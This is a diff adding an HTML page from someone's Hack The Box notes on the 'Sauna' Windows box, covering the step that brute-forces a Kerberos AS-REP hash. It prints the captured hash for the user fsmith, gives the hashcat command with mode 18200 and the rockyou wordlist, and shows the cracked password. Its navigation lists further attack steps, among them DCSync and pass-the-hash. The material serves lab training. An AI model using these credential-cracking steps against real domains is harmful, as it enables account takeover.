@@ -1,0 +1,50 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>hashcat BF Kerb TGT</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="styles.css" type="text/css" />
+</head>
+<body><div class="main"><div class="tree">
+<p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
+<p><a href="HacktheBox--Windows_Boxes--sauna.html">sauna</a></p>
+
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--sauna--nmapAuto.html">nmapAuto</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--sauna--nmapAuto--nmap.html">nmap</a></li>
+<li><a href="HacktheBox--Windows_Boxes--sauna--nmapAuto--ldapsearch.html">ldapsearch</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--sauna--http.html">http</a></li>
+<li><a href="HacktheBox--Windows_Boxes--sauna--vim_macro_breakdown.html">vim macro breakdown</a></li>
+<li><a href="HacktheBox--Windows_Boxes--sauna--initial_foothold.html">initial foothold</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--sauna--initial_foothold--kerbroute.html">kerbroute</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--sauna--initial_foothold--kerbroute--run_kerbrute_with_userlist.html">run kerbrute with userlist</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--sauna--initial_foothold--GetNPUser.py.html">GetNPUser.py</a></li>
+<li><a href="HacktheBox--Windows_Boxes--sauna--initial_foothold--hashcat_BF_Kerb_TGT.html">hashcat BF Kerb TGT</a></li>
+<li><a href="HacktheBox--Windows_Boxes--sauna--initial_foothold--evil_win-rm.html">evil win-rm </a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--sauna--privesc.html">privesc</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--sauna--privesc--winPEAS.html">winPEAS</a></li>
+<li><a href="HacktheBox--Windows_Boxes--sauna--privesc--bloodhound-sharphound.exe.html">bloodhound/sharphound.exe</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--sauna--privesc--bloodhound-sharphound.exe--neo4j_console.html">neo4j console</a></li>
+<li><a href="HacktheBox--Windows_Boxes--sauna--privesc--bloodhound-sharphound.exe--bloodhound_report.html">bloodhound report</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--sauna--privesc--bloodhound-sharphound.exe--bloodhound_report--find_shortest_path_to_Domain_Admins.html">find shortest path to Domain Admins</a></li>
+<li><a href="HacktheBox--Windows_Boxes--sauna--privesc--bloodhound-sharphound.exe--bloodhound_report--Find_principals_with_DCSync_Rights.html">Find principals with DCSync Rights</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--sauna--privesc--secretsdump.py.html">secretsdump.py</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--sauna--privesc--secretsdump.py--pass_the_hash_to_win.html">pass the hash to win</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--sauna--user-root.html">user/root</a></li>
+</ol></div>
+<div class="page"><h1><b><u>hashcat BF Kerb TGT</u></b></h1><span style="color:#24ff00;">next step is to take our </span><span style="color:#ffa500;">Kerb TGT</span> <span style="color:#ffa500;">hash</span><span style="color:#24ff00;"> and</span><span style="color:#ffff00;"> brute force</span><span style="color:#24ff00;"> it for its password with</span> <span style="color:#ffa500;">hashcat</span><span style="color:#24ff00;"><br /><br />lets save our TGT hash to the file </span><span style="color:#ffa500;">hashes</span><br /><span style="color:#ffff00;">$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:fb4e09de7f354d54190236d4413391cc$6372bb4ee5984d94f423e136420f9bb1d8f202129558e51e607881a2f3ee1848238cc00bcb687c10f0b99923e3ef72b10b8674bca265ae9543cc3b97518758585207f56d8949000e03a926e4c58944639375f09ff14232614702648b3bd3d9217ac214521b63c8c6f5b79c808b85d9d8b41f8e167ac6f262888cce44b75aadc1bf3f252c4130e88c2a346ac73ba1800597c8890eed1025fbe69b61724f5f46f7ba6a40a0bf89354590375f4aff31552d16c536a91e2fb4bad1e1d335f37918752701d8025b471149f21088885223d0e3fb709a167fcebe85f75d4bbf1de09afe7348933e10138ecfe1594c3a50ef619e7b7ec3dac78d772e7fd22a13137ec57e</span> <span style="color:#24ff00;"><br /><br />to find out which module to use we can grep hashcat formats for the </span><img src="images/1339-1.png" alt="images/1339-1.png" /> string to find which module hashcat requires to crack Kerberos Hashes<br /><img src="images/1339-2.png" alt="images/1339-2.png" /><br /><br />18200 works here through trial and error<br /><img src="images/1339-3.png" alt="images/1339-3.png" /><br /><br />now to run hashcat:<br /><span style="color:#ffa500;">hashcat -m 18200 hashes /usr/share/wordlists/rockyou.txt --force</span><br /><img src="images/1339-4.png" alt="images/1339-4.png" /><br /><br /><img src="images/1339-5.png" alt="images/1339-5.png" /><br /><img src="images/1339-6.png" alt="images/1339-6.png" /><br /><span style="color:#24ff00;">PW: </span><span style="color:#ffff00;">Thestrokes23</span></div></div>
+</body></html>
